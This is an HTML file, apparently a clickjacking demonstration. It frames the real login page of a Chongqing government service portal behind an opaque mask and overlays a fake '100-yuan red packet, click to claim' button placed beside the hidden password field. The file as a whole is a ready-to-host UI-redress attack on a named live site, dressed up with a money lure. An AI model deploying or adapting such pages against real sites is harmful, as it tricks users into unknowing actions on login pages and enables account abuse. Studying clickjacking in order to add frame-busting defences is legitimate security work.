<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>点击劫持演示（登录页-错位版）</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
        }
        /* 目标登录页 */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        /* 前景实心遮罩 */
        .mask {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            z-index: 2;
        }
        /* 红包按钮：偏右错位 */
        .red-packet {
            position: absolute;
            top: 45%;
            left: 58%; /* 把红包移到密码框旁边 */
            transform: translate(-50%, -50%);
            width: 180px;
            height: 240px;
            background: linear-gradient(135deg, #e53935, #ff5252);
            border-radius: 16px;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 30px rgba(229, 57, 53, 0.4);
            cursor: pointer;
            z-index: 3;
        }
        .red-packet .title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 12px;
        }
        .red-packet .desc {
            font-size: 14px;
            opacity: 0.95;
        }
    </style>
</head>
<body>
    <!-- 目标登录页 -->
    <iframe src="https://ywt.scjgj.cq.gov.cn/login"></iframe>

    <!-- 实心遮罩+错位红包 -->
    <div class="mask">
        <div class="red-packet">
            <div class="title">百元红包</div>
            <div class="desc">点击立即领取</div>
        </div>
    </div>
</body>
</html>
